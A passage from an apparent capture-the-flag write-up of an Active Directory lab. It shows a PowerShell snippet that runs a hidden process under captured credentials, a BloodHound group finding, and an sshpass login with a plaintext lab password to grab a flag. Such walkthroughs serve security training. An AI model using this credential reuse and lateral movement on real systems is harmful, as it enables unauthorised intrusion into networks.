    $targetFile = 'C:\temp.txt'
    $timestamp  = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
    "test => $timestamp" |
        Out-File -FilePath $targetFile -Encoding UTF8 -Append
}

Start-Process -FilePath pwsh -ArgumentList '-NoProfile','-Command',(
    [ScriptBlock]::Create($scriptBlock.ToString())
) -Credential $creds -Wait -WindowStyle Hidden
```

In `BloodHound`, we'll see that `wei.jie.tan` is also a member of the `senior-developers` group - which means that we can use this user to `SSH` into `sql01.antennae.rv` as well.


![](./assets/img/rv-sept/wjt.png)

We can use these credentials to authenticate to the `SSH` service on `sql01.antennae.rv`, and grab the `flag3.txt` file:

```
~$ sshpass -p 'klDCzcAiLGc2' ssh 'wei.jie.tan'@sql01.antennae.rv

PS C:\Users\wei.jie.tan\Desktop> cat flag3.txt
RV{lA7ERAl_m0vemenT_I5_a1SO_cOoL_3c69d6d47771c7d7671a5bf3c058e326}
```

# Flag 4: Privilege Escalation
